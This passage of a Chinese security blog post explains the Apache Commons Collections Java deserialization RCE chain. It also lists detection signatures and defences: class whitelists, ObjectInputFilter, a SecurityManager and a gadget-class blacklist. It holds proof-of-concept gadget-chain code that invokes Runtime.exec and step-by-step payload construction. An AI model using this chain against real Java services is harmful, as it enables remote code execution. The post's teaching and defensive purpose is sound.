class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当执行setValue()后会调用相应的transformedChain链。<br><strong>最终结果</strong>:我们精心构造的TransformedMap，在其任意键值被修改时，触发机制，从而执行命令。</p>
<hr>
<p>接下来的任务就是去找一个包含<strong>可控Map字段，并会在反序列化时对这个Map进行setValue()操作的类</strong>。我们的前辈在<br>Java运行类库中找见AnnotationInvocationHandler类，这个类完美符合我们的要求。传入Map对象，并在重写的readObject方法中对其进行setValue操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#jdk1.6.0_45\jre\lib\rt.jar!\sun\reflect\annotation\AnnotationInvocationHandler.class	</span><br><span class="line">class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = 6182022883658399397L;</span><br><span class="line">    private final Class type;</span><br><span class="line">    private final Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    private transient volatile Method[] memberMethods = null;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        this.type = var1;</span><br><span class="line">        this.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">        &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = this.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>成员变量memberValues是Map类型，readObject()函数中对memberValues的每一项都调用了setValue函数，（setVaule会调用checkSetValue，checkSetValue会调用transform()）。所以我们就可以使用前面构造的Map来构造AnnotationInvocationHandler，在进行序列化时 执行AnnotationInvocationHandler中重写的readObject方法，对value值进行修改，触发对应的transform链(执行命令)。</p>
</blockquote>
<h3 id="TransformedMap与AnnotationInvocationHandler"><a href="#TransformedMap与AnnotationInvocationHandler" class="headerlink" title="TransformedMap与AnnotationInvocationHandler"></a>TransformedMap与AnnotationInvocationHandler</h3><p>想要调用未包含的package中的构造函数，只能通过反射的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br></pre></td></tr></table></figure></p>
<p>且根据AnnotationInvocationHandler中readObject():<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String var6 = (String)var5.getKey();</span><br><span class="line">Class var7 = (Class)var3.get(var6);</span><br><span class="line">if (var7 != null) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们可知道条件是var5与var7不能为null，var3是Retention，查看下Retention的成员，发现只有一个value，那么var5只需要put一个键为字符串”value”，Value不为annotation的实例化对象即可(可以为任意String字符串与Integer对象))<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.16.42.14-image.png" alt="2019-03-27.16.42.14-image.png"></p>
<p>使用TransformedMap与AnnotationInvocationHandler类触发反序列化漏洞时的大致步骤:</p>
<blockquote>
<ul>
<li>使用ConstantTransformer与InvokerTransformer构造一个Transformer数组（指定需要执行的代码）</li>
<li>将第一步得到的数组转化为ChainedTransformer调用链</li>
<li>使用decorate方法创建数组outmap，参数为非空Map对象(map)与上一步得到的ChainedTransformer对象</li>
<li>使用Java反射机制创建AnnotationInvocationHandler对象，构造函数指定数组(outmap)</li>
<li>对AnnotationInvocationHandler进行序列化，发送给Java中间件</li>
<li>Java中间件在对AnnotationInvocationHandler进行反序列化时，调用其中重写的readObject方法，对传入的参数Map进行setValue操作，触发漏洞，调用ConstantTransformer与InvokerTransformer指定的任意代码</li>
</ul>
</blockquote>
<p>总结:            </p>
<blockquote>
<p>攻击者将构造好的包含攻击代码的序列化数据发送给使用了Apache Commons Collections等危险组件的Java中间件时，Java中间件在对其进行反序列化操作时，触发反序列化漏洞，执行攻击者构造的任意代码</p>
</blockquote>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><h4 id="搜索危险库"><a href="#搜索危险库" class="headerlink" title="搜索危险库"></a>搜索危险库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload 1.3.1</span><br><span class="line">commons-io 2.4</span><br><span class="line">commons-collections 3.1</span><br><span class="line">common-logging 1.2</span><br><span class="line">common-beanutils 1.9.2</span><br><span class="line">org.slf4j:slf4j-api 1.7.21</span><br><span class="line">com.mchange:mchange-commons-java 0.2.11</span><br><span class="line">org.apache.commons:commons-collections 4.0</span><br><span class="line">com.mchange:c3p0 0.9.5.2</span><br><span class="line">org.beanshell:bsh 2.0b5</span><br><span class="line">org.codehaus.groovy:groovy 2.3.9</span><br><span class="line">org.springframework:spring-aop 4.1.4.RELEASE</span><br></pre></td></tr></table></figure>
<h4 id="搜索危险函数"><a href="#搜索危险函数" class="headerlink" title="搜索危险函数"></a>搜索危险函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject		</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject	</span><br><span class="line">Yaml.load</span><br><span class="line">Json.parseObject</span><br><span class="line">XStream.fromXML</span><br></pre></td></tr></table></figure>
<h3 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h3><p><a href="https://xz.aliyun.com/t/2041#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/2041#toc-6</a><br>黑盒测试中，可通过抓包检测请求中可能存在的序列化数据(通常以AC ED开头 之后为两个字节的版本号0005 或者是base64编码后的rO0AB)<br>将序列化数据用<a href="https://github.com/NickstaDB/SerialBrute/" target="_blank" rel="noopener">SerialBrute.py脚本</a>处理后插入我们的payload</p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><h4 id="重写resolveClass来检验反序列化的类"><a href="#重写resolveClass来检验反序列化的类" class="headerlink" title="重写resolveClass来检验反序列化的类"></a>重写resolveClass来检验反序列化的类</h4><p>在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以我们可以通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化的校验。可以白名单检验:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class AntObjectInputStream extends ObjectInputStream&#123;</span><br><span class="line">    public AntObjectInputStream(InputStream inputStream) throws IOException&#123;</span><br><span class="line">        super(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    只允许反序列化User class</span><br><span class="line">     */</span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException,ClassNotFoundException&#123;</span><br><span class="line">        if(!desc.getName().equals(User.class))&#123;</span><br><span class="line">            throw new InvalidClassException(&quot;Unauthorized&quot;,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        return super.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用ObjectInputFilter来校验反序列化的类"><a href="#使用ObjectInputFilter来校验反序列化的类" class="headerlink" title="使用ObjectInputFilter来校验反序列化的类"></a>使用ObjectInputFilter来校验反序列化的类</h4><p>Java9支持序列化数据过滤的新特性，开发人员继承java.io.ObjectInputFilter类重写checkInput()实现自定义的过滤器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.util.List;</span><br><span class="line">import java.util.Optional;</span><br><span class="line">import java.util.function.Function;</span><br><span class="line">import java.io.ObjectInputFilter;</span><br><span class="line">class BikeFilter implements ObjectInputFilter &#123;</span><br><span class="line">	private long maxStreamBytes = 78; // Maximum allowed bytes in the stream.</span><br><span class="line">	private long maxDepth = 1; // Maximum depth of the graph allowed.</span><br><span class="line">	private long maxReferences = 1; // Maximum number of references in a graph.</span><br><span class="line">	@Override</span><br><span class="line">	public Status checkInput(FilterInfo filterInfo) &#123;</span><br><span class="line">		if (filterInfo.references() &lt; 0 || filterInfo.depth() &lt; 0 || filterInfo.streamBytes() &lt; 0 || filterInfo.references() &gt; maxReferences || filterInfo.depth() &gt; maxDepth|| filterInfo.streamBytes() &gt; maxStreamBytes) &#123;</span><br><span class="line">			return Status.REJECTED;</span><br><span class="line">		&#125;</span><br><span class="line">		Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">		if (clazz != null) &#123;</span><br><span class="line">			if (SerialObject.class == filterInfo.serialClass()) &#123;</span><br><span class="line">				return Status.ALLOWED;</span><br><span class="line">			&#125;</span><br><span class="line">			else &#123;</span><br><span class="line">				return Status.REJECTED;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return Status.UNDECIDED;</span><br><span class="line">	&#125; // end checkInput</span><br><span class="line">&#125; // end class BikeFilter</span><br></pre></td></tr></table></figure></p>
<p>只允许反序列化SerialObject类对象。</p>
<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h4 id="禁止JVM执行外部命令"><a href="#禁止JVM执行外部命令" class="headerlink" title="禁止JVM执行外部命令"></a>禁止JVM执行外部命令</h4><p>通过扩展SecurityManager来禁止执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager originalSecurityManager = System.getSecurityManager();</span><br><span class="line">        if (originalSecurityManager == null) &#123;</span><br><span class="line">            // 创建自己的SecurityManager</span><br><span class="line">            SecurityManager sm = new SecurityManager() &#123;</span><br><span class="line">                private void check(Permission perm) &#123;</span><br><span class="line">                    // 禁止exec</span><br><span class="line">                    if (perm instanceof java.io.FilePermission) &#123;</span><br><span class="line">                        String actions = perm.getActions();</span><br><span class="line">                        if (actions != null &amp;&amp; actions.contains(&quot;execute&quot;)) &#123;</span><br><span class="line">                            throw new SecurityException(&quot;execute denied!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    // 禁止设置新的SecurityManager，保护自己</span><br><span class="line">                    if (perm instanceof java.lang.RuntimePermission) &#123;</span><br><span class="line">                        String name = perm.getName();</span><br><span class="line">                        if (name != null &amp;&amp; name.contains(&quot;setSecurityManager&quot;)) &#123;</span><br><span class="line">                            throw new SecurityException(&quot;System.setSecurityManager denied!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                @Override</span><br><span class="line">                public void checkPermission(Permission perm) &#123;</span><br><span class="line">                    check(perm);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                @Override</span><br><span class="line">                public void checkPermission(Permission perm, Object context) &#123;</span><br><span class="line">                    check(perm);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            System.setSecurityManager(sm);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="禁止一些危险类"><a href="#禁止一些危险类" class="headerlink" title="禁止一些危险类"></a>禁止一些危险类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections.functors.InstantiateTransformer</span><br><span class="line">org.apache.commons.collections4.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections4.functors.InstantiateTransformer</span><br><span class="line">org.codehaus.groovy.runtime.ConvertedClosure</span><br><span class="line">org.codehaus.groovy.runtime.MethodClosure</span><br><span class="line">org.springframework.beans.factory.ObjectFactory</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.commons.beanutils</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/xiohao/p/4234184.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiohao/p/4234184.html</a><br><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">https://paper.seebug.org/312/</a><br><a href="http://www.vuln.cn/6296" target="_blank" rel="noopener">http://www.vuln.cn/6296</a><br><a href="https://xz.aliyun.com/t/3847" target="_blank" rel="noopener">https://xz.aliyun.com/t/3847</a><br><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">                //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">                //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                        Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //transformers数组 ChainedTransformer按顺序调用一系列的变换</span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map normalMap = new HashMap();</span><br><span class="line">        normalMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line"></span><br><span class="line">        //TransformedMap(map, keyTransformer, valueTransformer)</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap, null, transformedChain);</span><br><span class="line">        Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;1111&quot;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="../../../../index.html">Home</a></li>
         
          <li><a href="../../../../about.html">About</a></li>
         
          <li><a href="../../../../archives/">Writing</a></li>
         
          <li><a href="../../../../friends.html">Friends</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-CommonsCollections-序列化RCE漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">Apache-CommonsCollections 序列化RCE漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformedMap与AnnotationInvocationHandler"><span class="toc-number">2.1.</span> <span class="toc-text">TransformedMap与AnnotationInvocationHandler</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞检测"><span class="toc-number">3.</span> <span class="toc-text">漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#白盒"><span class="toc-number">3.1.</span> <span class="toc-text">白盒</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#搜索危险库"><span class="toc-number">3.1.1.</span> <span class="toc-text">搜索危险库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#搜索危险函数"><span class="toc-number">3.1.2.</span> <span class="toc-text">搜索危险函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑盒"><span class="toc-number">3.2.</span> <span class="toc-text">黑盒</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复方案"><span class="toc-number">4.</span> <span class="toc-text">修复方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#白名单"><span class="toc-number">4.1.</span> <span class="toc-text">白名单</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#重写resolveClass来检验反序列化的类"><span class="toc-number">4.1.1.</span> <span class="toc-text">重写resolveClass来检验反序列化的类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用ObjectInputFilter来校验反序列化的类"><span class="toc-number">4.1.2.</span> <span class="toc-text">使用ObjectInputFilter来校验反序列化的类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑名单"><span class="toc-number">4.2.</span> <span class="toc-text">黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#禁止JVM执行外部命令"><span class="toc-number">4.2.1.</span> <span class="toc-text">禁止JVM执行外部命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#禁止一些危险类"><span class="toc-number">4.2.2.</span> <span class="toc-text">禁止一些危险类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/28/Java反序列化/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/28/Java反序列化/&text=Java序列化与反序列化漏洞"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/28/Java反序列化/&title=Java序列化与反序列化漏洞"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/28/Java反序列化/&is_video=false&description=Java序列化与反序列化漏洞"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java序列化与反序列化漏洞&body=Check out this article: http://yoursite.com/2019/02/28/Java反序列化/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/28/Java反序列化/&title=Java序列化与反序列化漏洞"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/28/Java反序列化/&title=Java序列化与反序列化漏洞"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/28/Java反序列化/&title=Java序列化与反序列化漏洞"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/28/Java反序列化/&title=Java序列化与反序列化漏洞"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/28/Java反序列化/&name=Java序列化与反序列化漏洞&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    版权所有 &copy; 2019 P0rZ9
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="../../../../lib/font-awesome/css/font-awesome.min.css">
<link rel="stylesheet" href="../../../../lib/meslo-LG/styles.css">
<link rel="stylesheet" href="../../../../lib/justified-gallery/justifiedGallery.min.css">


<!-- jquery -->
<script src="../../../../lib/jquery/jquery.min.js"></script>
<script src="../../../../lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
<script src="../../../../js/main.js"></script>
<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-86660611-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Disqus Comments -->


